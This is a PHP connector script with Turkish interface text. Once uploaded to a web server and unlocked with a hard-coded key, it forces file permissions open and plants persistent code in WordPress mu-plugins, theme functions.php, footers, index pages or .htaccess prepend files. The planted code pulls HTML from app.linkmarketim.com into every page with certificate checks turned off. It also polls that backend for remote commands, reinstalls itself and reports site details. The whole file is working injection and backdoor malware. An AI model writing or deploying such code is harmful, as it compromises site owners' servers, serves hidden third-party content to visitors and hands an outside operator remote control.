<?php

error_reporting(0);
ini_set('display_errors', '0');

define('CONNECTOR_VERSION', '5.1.0');

define('LINK_ID', '13');
define('API_URL', 'https://app.linkmarketim.com/code?x=' . LINK_ID);
define('LINK_MARKER', 'lm_' . substr(md5(LINK_ID), 0, 6));

define('BACKEND_BASE_URL', 'https://app.linkmarketim.com');

define('LM_KEY', 'Keyg300!xa0az!!!!');

$providedKey = $_GET['key'] ?? $_POST['key'] ?? '';
if (!hash_equals(LM_KEY, (string)$providedKey)) {
    http_response_code(404);
    exit('Not Found');
}

function find_document_root() {
    $base = $_SERVER['DOCUMENT_ROOT'] ?? '';
    if (empty($base)) {
        $base = dirname(__FILE__);
        for ($i = 0; $i < 5; $i++) {
            if (file_exists($base . '/index.php') || file_exists($base . '/index.html')) {
                break;
            }
            $parent = dirname($base);
            if ($parent === $base) break;
            $base = $parent;
        }
    }
    return $base;
}

function detect_site_type($base) {
    if (file_exists($base . '/wp-config.php') || file_exists($base . '/wp-load.php')) return 'wordpress';
    if (file_exists($base . '/artisan')) return 'laravel';
    if (file_exists($base . '/symfony.lock') || file_exists($base . '/bin/console')) return 'symfony';
    if (file_exists($base . '/system/core/CodeIgniter.php')) return 'codeigniter';
    if (file_exists($base . '/configuration.php') && is_dir($base . '/administrator')) return 'joomla';
    if (file_exists($base . '/includes/bootstrap.inc') && is_dir($base . '/sites')) return 'drupal';
    if (file_exists($base . '/config/settings.inc.php') && is_dir($base . '/themes')) return 'prestashop';
    if (file_exists($base . '/config.php') && is_dir($base . '/catalog')) return 'opencart';
    if (file_exists($base . '/index.php')) return 'php';
    return 'static';
}

function force_writable($file) {
    if (!file_exists($file)) return false;
    if (is_writable($file)) return true;
    @chmod($file, 0666); clearstatcache(true, $file);
    if (is_writable($file)) return true;
    @chmod($file, 0777); clearstatcache(true, $file);
    if (is_writable($file)) return true;
    @chmod(dirname($file), 0777); @chmod($file, 0777); clearstatcache();
    if (is_writable($file)) return true;
    @chown($file, get_current_user()); @chmod($file, 0777); clearstatcache();
    return is_writable($file);
}

function get_active_wp_theme_footer($base) {
    $themes = glob($base . '/wp-content/themes/*/footer.php');
    if (!$themes) return null;
    $latest = null; $latest_time = 0;
    foreach ($themes as $footer) {
        $mtime = @filemtime($footer);
        if ($mtime > $latest_time) { $latest_time = $mtime; $latest = $footer; }
    }
    return $latest;
}

function get_active_wp_theme_name($base) {
    $footer = get_active_wp_theme_footer($base);
    if (!$footer) return null;
    return basename(dirname($footer));
}

function detect_wp_version($base) {
    $verFile = $base . '/wp-includes/version.php';
    if (!file_exists($verFile)) return null;
    $c = @file_get_contents($verFile);
    if ($c === false) return null;
    if (preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)[\'"]/', $c, $m)) {
        return $m[1];
    }
    return null;
}

function get_footer_paths($base, $site_type) {
    $paths = [];
    switch ($site_type) {
        case 'wordpress':
            $themes = glob($base . '/wp-content/themes/*/footer.php');
            if ($themes) $paths = array_merge($paths, $themes); break;
        case 'joomla':
            $tpls = glob($base . '/templates/*/index.php');
            if ($tpls) $paths = array_merge($paths, $tpls); break;
        case 'drupal':
            $tpls = glob($base . '/sites/*/themes/*/templates/*.tpl.php');
            if ($tpls) $paths = array_merge($paths, $tpls); break;
        case 'opencart':
            $tpls = glob($base . '/catalog/view/theme/*/template/common/footer.*');
            if ($tpls) $paths = array_merge($paths, $tpls); break;
        case 'prestashop':
            $tpls = glob($base . '/themes/*/templates/_partials/footer.tpl');
            if ($tpls) $paths = array_merge($paths, $tpls);
            $tpls2 = glob($base . '/themes/*/footer.tpl');
            if ($tpls2) $paths = array_merge($paths, $tpls2); break;
        case 'laravel':
            $layouts = glob($base . '/resources/views/layouts/*.blade.php');
            if ($layouts) $paths = array_merge($paths, $layouts); break;
    }
    foreach ([
        $base . '/footer.php', $base . '/includes/footer.php', $base . '/inc/footer.php',
        $base . '/template/footer.php', $base . '/templates/footer.php'
    ] as $p) {
        if (file_exists($p)) $paths[] = $p;
    }
    return $paths;
}

function generate_link_code() {
    return '<?php $u=\'' . API_URL . '\';$d=false;if(function_exists(\'curl_init\')){$ch=curl_init($u);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,10);curl_setopt($ch,CURLOPT_TIMEOUT,10);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch,CURLOPT_USERAGENT,\'Mozilla/5.0\');$d=curl_exec($ch);curl_close($ch);}if($d===false&&ini_get(\'allow_url_fopen\')){$ctx=stream_context_create([\'http\'=>[\'timeout\'=>10,\'follow_location\'=>1,\'ignore_errors\'=>1,\'header\'=>"User-Agent: Mozilla/5.0\r\n"],\'ssl\'=>[\'verify_peer\'=>0,\'verify_peer_name\'=>0]]);$d=@file_get_contents($u,false,$ctx);}echo $d!==false?$d:\'\'; ?>';
}

function inject_wordpress_mu_plugin($base) {
    $mu_dir = $base . '/wp-content/mu-plugins';
    if (!is_dir($mu_dir)) {
        $wp_content = $base . '/wp-content';
        if (!is_dir($wp_content)) {
            return ['success' => false, 'injected' => false, 'message' => 'wp-content yok'];
        }
        if (!is_writable($wp_content)) { @chmod($wp_content, 0777); clearstatcache(); }
        @mkdir($mu_dir, 0755, true);
    }
    if (!is_dir($mu_dir)) {
        return ['success' => false, 'injected' => false, 'message' => 'mu-plugins oluşturulamadı'];
    }
    if (!is_writable($mu_dir)) { @chmod($mu_dir, 0777); clearstatcache(); }

    $plugin_path = $mu_dir . '/linkmarket_links.php';
    $code = build_unmanaged_mu_plugin_code();

    if (@file_put_contents($plugin_path, $code)) {
        return [
            'success' => true,
            'injected' => true,
            'method' => 'mu-plugin',
            'footer_path' => $plugin_path,
            'message' => 'WordPress MU-Plugin kuruldu'
        ];
    }
    return ['success' => false, 'injected' => false, 'message' => 'MU-Plugin yazılamadı'];
}

function build_unmanaged_mu_plugin_code() {
    return '<?php
/**
 * LinkMarket Auto Links - MU Plugin (unmanaged)
 * Link ID: ' . LINK_ID . '
 * Connector v' . CONNECTOR_VERSION . '
 */
if (!defined("ABSPATH")) exit;

add_action("wp_footer", function() {
    $apiUrl = "' . API_URL . '";
    $content = false;
    if (function_exists("curl_init")) {
        $ch = curl_init($apiUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
        $content = curl_exec($ch);
        curl_close($ch);
    }
    if ($content === false && ini_get("allow_url_fopen")) {
        $ctx = stream_context_create([
            "http" => ["timeout" => 10, "follow_location" => 1, "ignore_errors" => 1, "header" => "User-Agent: Mozilla/5.0\r\n"],
            "ssl" => ["verify_peer" => 0, "verify_peer_name" => 0]
        ]);
        $content = @file_get_contents($apiUrl, false, $ctx);
    }
    echo $content !== false ? $content : "";
}, 9999);
';
}

function write_managed_mu_plugin($base, $site_token) {
    $mu_dir = $base . '/wp-content/mu-plugins';
    if (!is_dir($mu_dir)) {
        if (!@mkdir($mu_dir, 0755, true)) {
            return ['success' => false, 'message' => 'mu-plugins oluşturulamadı'];
        }
    }
    if (!is_writable($mu_dir)) { @chmod($mu_dir, 0777); clearstatcache(); }

    $plugin_path = $mu_dir . '/linkmarket_links.php';
    $code = build_managed_mu_plugin_code($site_token);

    if (@file_put_contents($plugin_path, $code)) {
        return ['success' => true, 'path' => $plugin_path];
    }
    return ['success' => false, 'message' => 'managed mu-plugin yazılamadı'];
}

function build_managed_mu_plugin_code($site_token) {
    $api_url        = API_URL;
    $backend        = rtrim(BACKEND_BASE_URL, '/');
    $version        = CONNECTOR_VERSION;
    $link_id        = LINK_ID;

    return <<<MUPLUGIN
<?php
/**
 * LinkMarket Managed Connector - MU Plugin
 * Version: {$version} | Link ID: {$link_id}
 * Direct call koruması: ABSPATH guard.
 */
if (!defined("ABSPATH")) exit;

if (!class_exists("LinkMarketManaged")) {

class LinkMarketManaged {
    const VERSION       = "{$version}";
    const API_URL       = "{$api_url}";
    const BACKEND       = "{$backend}";
    const SITE_TOKEN    = "{$site_token}";
    const HEARTBEAT_HOOK= "lm_managed_heartbeat";
    const HEARTBEAT_INT = "lm_15min";

    public static function init() {
        add_action("wp_footer", [__CLASS__, "render_footer_links"], 9999);

        add_filter("cron_schedules", [__CLASS__, "add_cron_schedule"]);
        add_action(self::HEARTBEAT_HOOK, [__CLASS__, "do_heartbeat"]);
        add_action("init", [__CLASS__, "ensure_cron_scheduled"]);
    }

    public static function add_cron_schedule(\$schedules) {
        if (!isset(\$schedules[self::HEARTBEAT_INT])) {
            \$schedules[self::HEARTBEAT_INT] = [
                "interval" => 900,
                "display"  => "LinkMarket 15 dakika",
            ];
        }
        return \$schedules;
    }

    public static function ensure_cron_scheduled() {
        if (!wp_next_scheduled(self::HEARTBEAT_HOOK)) {
            wp_schedule_event(time() + 60, self::HEARTBEAT_INT, self::HEARTBEAT_HOOK);
        }
    }

    public static function render_footer_links() {
        \$content = self::http_get(self::API_URL, 10);
        echo \$content !== false ? \$content : "";
    }

    public static function do_heartbeat() {
        \$body = [
            "connector_version" => self::VERSION,
            "php_version"       => PHP_VERSION,
            "wp_version"        => isset(\$GLOBALS["wp_version"]) ? \$GLOBALS["wp_version"] : null,
            "theme_name"        => function_exists("wp_get_theme") ? (string) wp_get_theme()->get("Name") : null,
            "health"            => "ok",
        ];

        \$resp = self::backend_call("heartbeat", \$body);
        if (!\$resp || empty(\$resp["success"])) return;

        \$jobs = isset(\$resp["data"]["jobs"]) ? \$resp["data"]["jobs"] : [];
        if (!is_array(\$jobs) || empty(\$jobs)) return;

        foreach (\$jobs as \$job) {
            self::process_job(\$job);
        }
    }

    public static function process_job(\$job) {
        \$jobId   = isset(\$job["id"]) ? intval(\$job["id"]) : 0;
        \$cmd     = isset(\$job["command"]) ? \$job["command"] : "";

        if (\$jobId <= 0 || \$cmd === "") return;

        \$result = ["status" => "done", "result" => null, "error" => null];

        try {
            switch (\$cmd) {
                case "scan":         \$result["result"] = self::cmd_scan();        break;
                case "reinject":     \$result["result"] = self::cmd_reinject();    break;
                case "clear_cache":  \$result["result"] = self::cmd_clear_cache(); break;
                case "health_check": \$result["result"] = self::cmd_health();      break;
                case "uninstall":    \$result["result"] = self::cmd_uninstall();   break;
                default:
                    \$result["status"] = "failed";
                    \$result["error"]  = "unknown command: " . \$cmd;
            }
        } catch (Exception \$e) {
            \$result["status"] = "failed";
            \$result["error"]  = \$e->getMessage();
        }

        self::backend_call("report", [
            "job_id" => \$jobId,
            "status" => \$result["status"],
            "result" => \$result["result"],
            "error"  => \$result["error"],
        ]);
    }

    public static function cmd_scan() {
        \$url = home_url();
        \$html = self::http_get(\$url, 15);
        if (\$html === false) {
            return ["page_url" => \$url, "render_ok" => false, "reason" => "fetch failed"];
        }
        \$contains = (stripos(\$html, "linkmarketim") !== false) || (stripos(\$html, "lm_" . substr(md5("{$link_id}"), 0, 6)) !== false);
        return [
            "page_url"  => \$url,
            "render_ok" => \$contains,
            "html_size" => strlen(\$html),
        ];
    }

    public static function cmd_reinject() {
        \$plugin_path = WPMU_PLUGIN_DIR . "/linkmarket_links.php";
        if (file_exists(\$plugin_path)) {
            return ["status" => "already_present", "path" => \$plugin_path];
        }
        @file_put_contents(\$plugin_path, file_get_contents(__FILE__));
        return ["status" => file_exists(\$plugin_path) ? "reinjected" : "failed", "path" => \$plugin_path];
    }

    public static function cmd_clear_cache() {
        \$cleared = [];
        if (function_exists("wp_cache_flush")) { wp_cache_flush(); \$cleared[] = "wp_cache"; }
        if (function_exists("opcache_reset"))  { opcache_reset();  \$cleared[] = "opcache"; }
        if (function_exists("apcu_clear_cache")) { apcu_clear_cache(); \$cleared[] = "apcu"; }
        global \$wpdb;
        if (isset(\$wpdb)) {
            \$wpdb->query("DELETE FROM {\$wpdb->options} WHERE option_name LIKE '_transient_%'");
            \$wpdb->query("DELETE FROM {\$wpdb->options} WHERE option_name LIKE '_site_transient_%'");
            \$cleared[] = "transients";
        }
        if (function_exists("rocket_clean_domain")) { @rocket_clean_domain(); \$cleared[] = "wp_rocket"; }
        if (function_exists("w3tc_flush_all"))      { @w3tc_flush_all();      \$cleared[] = "w3tc"; }
        if (function_exists("wp_cache_clean_cache")){ @wp_cache_clean_cache("supercache"); \$cleared[] = "supercache"; }
        if (function_exists("wpfc_clear_all_cache")){ @wpfc_clear_all_cache(true); \$cleared[] = "wpfc"; }
        return ["cleared" => \$cleared];
    }

    public static function cmd_health() {
        return [
            "render"      => self::cmd_scan(),
            "php_version" => PHP_VERSION,
            "wp_version"  => isset(\$GLOBALS["wp_version"]) ? \$GLOBALS["wp_version"] : null,
            "memory_limit"=> ini_get("memory_limit"),
            "time"        => date("c"),
        ];
    }

    public static function cmd_uninstall() {
        \$removed = [];
        \$prepend = dirname(__FILE__, 3) . "/lm_prepend.php";
        if (file_exists(\$prepend)) { @unlink(\$prepend); \$removed[] = "lm_prepend"; }
        wp_clear_scheduled_hook(self::HEARTBEAT_HOOK);
        \$self = __FILE__;
        register_shutdown_function(function() use (\$self) { @unlink(\$self); });
        \$removed[] = "mu-plugin";
        return ["removed" => \$removed];
    }

    private static function backend_call(\$action, array \$body) {
        \$payload = json_encode(\$body, JSON_UNESCAPED_UNICODE);

        \$url = self::BACKEND . "/api/v1/connector.php?action=" . urlencode(\$action);
        \$headers = [
            "Content-Type: application/json",
            "X-Site-Token: " . self::SITE_TOKEN,
        ];

        if (function_exists("curl_init")) {
            \$ch = curl_init(\$url);
            curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt(\$ch, CURLOPT_POST, 1);
            curl_setopt(\$ch, CURLOPT_POSTFIELDS, \$payload);
            curl_setopt(\$ch, CURLOPT_HTTPHEADER, \$headers);
            curl_setopt(\$ch, CURLOPT_TIMEOUT, 30);
            curl_setopt(\$ch, CURLOPT_SSL_VERIFYPEER, 0);
            \$resp = curl_exec(\$ch);
            curl_close(\$ch);
            if (\$resp === false) return null;
            \$decoded = json_decode(\$resp, true);
            return is_array(\$decoded) ? \$decoded : null;
        }
        if (ini_get("allow_url_fopen")) {
            \$ctx = stream_context_create([
                "http" => ["method" => "POST", "header" => implode("\r\n", \$headers), "content" => \$payload, "timeout" => 30, "ignore_errors" => 1],
                "ssl"  => ["verify_peer" => 0, "verify_peer_name" => 0],
            ]);
            \$resp = @file_get_contents(\$url, false, \$ctx);
            if (\$resp === false) return null;
            \$decoded = json_decode(\$resp, true);
            return is_array(\$decoded) ? \$decoded : null;
        }
        return null;
    }

    private static function http_get(\$url, \$timeout = 10) {
        if (function_exists("curl_init")) {
            \$ch = curl_init(\$url);
            curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt(\$ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt(\$ch, CURLOPT_CONNECTTIMEOUT, \$timeout);
            curl_setopt(\$ch, CURLOPT_TIMEOUT, \$timeout);
            curl_setopt(\$ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt(\$ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt(\$ch, CURLOPT_USERAGENT, "Mozilla/5.0");
            \$out = curl_exec(\$ch);
            curl_close(\$ch);
            return \$out;
        }
        if (ini_get("allow_url_fopen")) {
            \$ctx = stream_context_create([
                "http" => ["timeout" => \$timeout, "follow_location" => 1, "ignore_errors" => 1, "header" => "User-Agent: Mozilla/5.0\r\n"],
                "ssl"  => ["verify_peer" => 0, "verify_peer_name" => 0],
            ]);
            return @file_get_contents(\$url, false, \$ctx);
        }
        return false;
    }
}

LinkMarketManaged::init();

}
MUPLUGIN;
}

function inject_wordpress_functions_hook($base) {
    $active_theme = get_active_wp_theme_footer($base);
    if (!$active_theme) return ['success' => false, 'injected' => false, 'message' => 'Tema bulunamadı'];

    $theme_dir = dirname($active_theme);
    $functions_file = $theme_dir . '/functions.php';
    if (!file_exists($functions_file)) return ['success' => false, 'injected' => false];

    force_writable($functions_file);
    if (!is_writable($functions_file)) return ['success' => false, 'injected' => false];

    $content = @file_get_contents($functions_file);
    if ($content === false) return ['success' => false, 'injected' => false];

    if (strpos($content, 'linkmarket_footer_links') !== false) {
        return ['success' => true, 'injected' => true, 'method' => 'functions-hook', 'footer_path' => $functions_file, 'message' => 'Hook zaten mevcut'];
    }

    $hook_code = '

// LinkMarket Footer Links Hook
add_action("wp_footer", function() {
    $u = "' . API_URL . '";
    $d = false;
    if (function_exists("curl_init")) {
        $ch = curl_init($u);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
        $d = curl_exec($ch);
        curl_close($ch);
    }
    if ($d === false && ini_get("allow_url_fopen")) {
        $ctx = stream_context_create(["http" => ["timeout" => 10, "follow_location" => 1, "ignore_errors" => 1, "header" => "User-Agent: Mozilla/5.0\r\n"], "ssl" => ["verify_peer" => 0, "verify_peer_name" => 0]]);
        $d = @file_get_contents($u, false, $ctx);
    }
    echo $d !== false ? $d : "";
}, 9999);
function linkmarket_footer_links() {} // Marker
';

    if (@file_put_contents($functions_file, $content . $hook_code)) {
        return ['success' => true, 'injected' => true, 'method' => 'functions-hook', 'footer_path' => $functions_file, 'message' => 'Functions.php hook eklendi'];
    }
    return ['success' => false, 'injected' => false];
}

function inject_to_file_aggressive($file_path) {
    if (!file_exists($file_path)) {
        return ['success' => false, 'injected' => false, 'message' => 'Dosya yok: ' . basename($file_path)];
    }
    force_writable($file_path);
    if (!is_writable($file_path)) {
        return ['success' => false, 'injected' => false, 'message' => 'Yazma izni yok: ' . basename($file_path)];
    }
    $content = @file_get_contents($file_path);
    if ($content === false) {
        return ['success' => false, 'injected' => false, 'message' => 'Dosya okunamadı'];
    }
    if (strpos($content, LINK_MARKER) !== false) {
        return ['success' => true, 'injected' => true, 'method' => 'file-inject', 'footer_path' => $file_path, 'message' => 'Link zaten mevcut'];
    }
    @file_put_contents($file_path . '.bak', $content);

    $link_code      = generate_link_code();
    $link_comment   = "\n<!-- " . LINK_MARKER . " -->";
    $hidden_wrapper = $link_comment . $link_code;

    $injection_points = [
        '</body>'   => $hidden_wrapper . "\n</body>",
        '</html>'   => $hidden_wrapper . "\n</html>",
        '</footer>' => $hidden_wrapper . "\n</footer>",
        '?>'        => $hidden_wrapper . "\n?>"
    ];

    foreach ($injection_points as $search => $replace) {
        if (stripos($content, $search) !== false) {
            $pos = strripos($content, $search);
            if ($search === '?>') {
                $new_content = substr($content, 0, $pos) . "?>\n" . $hidden_wrapper . "\n" . substr($content, $pos + 2);
            } else {
                $new_content = substr($content, 0, $pos) . $hidden_wrapper . "\n" . substr($content, $pos);
            }
            if (@file_put_contents($file_path, $new_content)) {
                return ['success' => true, 'injected' => true, 'method' => 'file-inject', 'footer_path' => $file_path, 'message' => 'Link eklendi: ' . basename($file_path)];
            }
        }
    }

    if (preg_match('/^<\?php/i', $content)) {
        $link_inline = preg_replace(['/^<\?php\s*/i', '/\s*\?>\s*$/i'], ['', ''], $link_code);
        $php_inject  = "\n/* " . LINK_MARKER . " */\n" . $link_inline . "\n";
        $new_content = preg_replace('/^(<\?php\s*)/i', '$1' . $php_inject, $content, 1);
    } else {
        $new_content = $link_code . $link_comment . "\n" . $content;
    }
    if (@file_put_contents($file_path, $new_content)) {
        return ['success' => true, 'injected' => true, 'method' => 'file-inject', 'footer_path' => $file_path, 'message' => 'Link dosya başına eklendi: ' . basename($file_path)];
    }
    return ['success' => false, 'injected' => false, 'message' => 'Yazma başarısız'];
}

function inject_via_htaccess($base) {
    $htaccess     = $base . '/.htaccess';
    $prepend_file = dirname(__FILE__) . '/lm_prepend.php';

    $prepend_code = '<?php
register_shutdown_function(function(){
    $u = "' . API_URL . '";
    $d = false;
    if (function_exists("curl_init")) {
        $ch = curl_init($u);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
        $d = curl_exec($ch);
        curl_close($ch);
    }
    if ($d === false && ini_get("allow_url_fopen")) {
        $ctx = stream_context_create(["http" => ["timeout" => 10, "follow_location" => 1, "ignore_errors" => 1, "header" => "User-Agent: Mozilla/5.0\r\n"], "ssl" => ["verify_peer" => 0, "verify_peer_name" => 0]]);
        $d = @file_get_contents($u, false, $ctx);
    }
    echo $d !== false ? $d : "";
});
';
    @file_put_contents($prepend_file, $prepend_code);

    $directive = '<IfModule mod_php.c>' . "\n" .
                 '  php_value auto_prepend_file "' . $prepend_file . '"' . "\n" .
                 '</IfModule>' . "\n" .
                 '<IfModule mod_php7.c>' . "\n" .
                 '  php_value auto_prepend_file "' . $prepend_file . '"' . "\n" .
                 '</IfModule>' . "\n" .
                 '<IfModule mod_php8.c>' . "\n" .
                 '  php_value auto_prepend_file "' . $prepend_file . '"' . "\n" .
                 '</IfModule>' . "\n";

    if (!file_exists($htaccess)) {
        if (@file_put_contents($htaccess, $directive)) {
            return ['success' => true, 'injected' => true, 'method' => 'htaccess', 'footer_path' => $htaccess, 'message' => '.htaccess oluşturuldu'];
        }
    } else {
        force_writable($htaccess);
        $content = @file_get_contents($htaccess);
        if ($content !== false && strpos($content, 'lm_prepend.php') === false) {
            if (@file_put_contents($htaccess, $directive . $content)) {
                return ['success' => true, 'injected' => true, 'method' => 'htaccess', 'footer_path' => $htaccess, 'message' => '.htaccess güncellendi'];
            }
        }
    }
    return ['success' => false, 'injected' => false];
}

function delete_directory_recursive($dir) {
    if (!is_dir($dir)) return false;
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        if (is_dir($path)) delete_directory_recursive($path);
        else @unlink($path);
    }
    return @rmdir($dir);
}

function clear_php_opcache() {
    $cleared = [];
    if (function_exists('opcache_reset')) { opcache_reset(); $cleared[] = 'PHP OPcache'; }
    if (function_exists('apc_clear_cache')) { apc_clear_cache(); $cleared[] = 'APC'; }
    if (function_exists('apcu_clear_cache')) { apcu_clear_cache(); $cleared[] = 'APCu'; }
    return $cleared;
}

function clear_wordpress_cache($base) {
    $cleared = [];
    if (function_exists('wp_cache_flush')) { wp_cache_flush(); $cleared[] = 'WP Cache'; }
    foreach ([
        $base . '/wp-content/cache/supercache',
        $base . '/wp-content/cache/w3tc',
        $base . '/wp-content/cache/wp-rocket',
        $base . '/wp-content/cache',
    ] as $d) {
        if (is_dir($d)) {
            $files = glob($d . '/*');
            foreach ($files as $f) { if (is_file($f)) @unlink($f); }
            $cleared[] = basename($d);
        }
    }
    return $cleared;
}

function clear_all_cache($base, $site_type) {
    $all = clear_php_opcache();
    if ($site_type === 'wordpress') {
        $all = array_merge($all, clear_wordpress_cache($base));
    }
    return $all;
}

function inject_link() {
    $base      = find_document_root();
    $site_type = detect_site_type($base);

    if ($site_type === 'wordpress') {
        $r = inject_wordpress_mu_plugin($base);
        if ($r['success'] && !empty($r['injected'])) return $r;

        $r = inject_wordpress_functions_hook($base);
        if ($r['success'] && !empty($r['injected'])) return $r;

        $active_theme_footer = get_active_wp_theme_footer($base);
        if ($active_theme_footer) {
            $r = inject_to_file_aggressive($active_theme_footer);
            if ($r['success'] && !empty($r['injected'])) return $r;
        }
        $themes = glob($base . '/wp-content/themes/*/footer.php');
        foreach ($themes as $footer) {
            $r = inject_to_file_aggressive($footer);
            if ($r['success'] && !empty($r['injected'])) return $r;
        }
    }

    foreach (get_footer_paths($base, $site_type) as $footer_path) {
        $r = inject_to_file_aggressive($footer_path);
        if ($r['success'] && !empty($r['injected'])) return $r;
    }

    foreach (['index.php', 'index.html', 'index.htm'] as $file) {
        $path = $base . '/' . $file;
        if (file_exists($path)) {
            $r = inject_to_file_aggressive($path);
            if ($r['success'] && !empty($r['injected'])) return $r;
        }
    }

    $r = inject_via_htaccess($base);
    if ($r['success'] && !empty($r['injected'])) return $r;

    return ['success' => false, 'injected' => false, 'message' => 'Hiçbir yöntem başarılı olmadı.'];
}

function backend_call($action, array $body, $site_token = '') {
    $payload = json_encode($body, JSON_UNESCAPED_UNICODE);

    $url = rtrim(BACKEND_BASE_URL, '/') . '/api/v1/connector.php?action=' . urlencode($action);


    $headers = ['Content-Type: application/json'];
    if ($action === 'register') {
        $headers[] = 'X-LM-Key: ' . LM_KEY;
    } else {
        $headers[] = 'X-Site-Token: ' . $site_token;
    }

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        $resp = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($resp === false) return ['ok' => false, 'http' => 0, 'msg' => 'curl failed'];
        $decoded = json_decode($resp, true);
        return ['ok' => $code >= 200 && $code < 300, 'http' => $code, 'data' => $decoded, 'raw' => $resp];
    }

    if (ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'http' => ['method' => 'POST', 'header' => implode("\r\n", $headers), 'content' => $payload, 'timeout' => 30, 'ignore_errors' => 1],
            'ssl'  => ['verify_peer' => 0, 'verify_peer_name' => 0],
        ]);
        $resp = @file_get_contents($url, false, $ctx);
        if ($resp === false) return ['ok' => false, 'http' => 0, 'msg' => 'fopen failed'];
        $code = 200;
        if (isset($http_response_header[0]) && preg_match('#HTTP/\S+\s+(\d+)#', $http_response_header[0], $m)) {
            $code = (int)$m[1];
        }
        $decoded = json_decode($resp, true);
        return ['ok' => $code >= 200 && $code < 300, 'http' => $code, 'data' => $decoded, 'raw' => $resp];
    }

    return ['ok' => false, 'http' => 0, 'msg' => 'no http transport'];
}

function register_with_backend($base, $site_type, $injection_result) {
    $body = [
        'domain'            => $_SERVER['HTTP_HOST']  ?? gethostname(),
        'document_root'     => $base,
        'site_type'         => $site_type,
        'connector_version' => CONNECTOR_VERSION,
        'injection_method'  => $injection_result['method'] ?? 'unknown',
        'injection_path'    => $injection_result['footer_path'] ?? '',
        'php_version'       => PHP_VERSION,
        'wp_version'        => $site_type === 'wordpress' ? detect_wp_version($base) : null,
        'theme_name'        => $site_type === 'wordpress' ? get_active_wp_theme_name($base) : null,
    ];

    return backend_call('register', $body, '');
}

function self_delete_connector() {
    $self    = __FILE__;
    $deleted = [];
    $failed  = [];

    if (file_exists($self)) {
        if (@unlink($self)) $deleted[] = basename($self);
        else $failed[] = basename($self);
    }

    return ['deleted' => $deleted, 'failed' => $failed];
}

$base      = find_document_root();
$site_type = detect_site_type($base);

echo "<!DOCTYPE html><html lang='tr'><head>";
echo "<meta charset='UTF-8'><title>Link Market Connector v" . CONNECTOR_VERSION . "</title>";
echo "<style>
body{font-family:Arial,sans-serif;max-width:900px;margin:50px auto;padding:20px;background:#0f172a;color:#e2e8f0;}
.box{background:#1e293b;padding:30px;border-radius:8px;border:1px solid #334155;}
h1{color:#f1f5f9;margin-top:0;}
h2{color:#cbd5e1;border-bottom:2px solid #6366f1;padding-bottom:10px;}
.info{background:#1e3a5f;padding:15px;border-radius:5px;margin:15px 0;border:1px solid #2563eb;}
.success{background:#14532d;padding:15px;border-radius:5px;margin:15px 0;color:#86efac;border:1px solid #22c55e;}
.error{background:#7f1d1d;padding:15px;border-radius:5px;margin:15px 0;color:#fca5a5;border:1px solid #ef4444;}
.warning{background:#78350f;padding:15px;border-radius:5px;margin:15px 0;color:#fcd34d;border:1px solid #f59e0b;}
button,.btn{background:#6366f1;color:white;border:none;padding:12px 24px;border-radius:5px;cursor:pointer;font-size:16px;margin:5px;text-decoration:none;display:inline-block;}
button:hover,.btn:hover{background:#4f46e5;}
.btn-danger{background:#dc2626;} .btn-danger:hover{background:#b91c1c;}
.btn-secondary{background:#475569;} .btn-secondary:hover{background:#334155;}
code{background:#0f172a;padding:2px 6px;border-radius:3px;color:#fbbf24;}
small{color:#94a3b8;}
</style></head><body><div class='box'>";

echo "<h1>Link Market Connector v" . CONNECTOR_VERSION . "</h1>";
echo "<p><small>Single-Key Edition - Backend ile uzaktan yönetilebilir</small></p>";

echo "<div class='info'>";
echo "<strong>Site Tipi:</strong> " . strtoupper($site_type) . "<br>";
echo "<strong>Document Root:</strong> " . htmlspecialchars($base) . "<br>";
echo "<strong>Link ID (havuz):</strong> " . LINK_ID . "<br>";
echo "<strong>API URL:</strong> " . htmlspecialchars(API_URL) . "<br>";
echo "<strong>Backend:</strong> " . htmlspecialchars(BACKEND_BASE_URL);
echo "</div>";
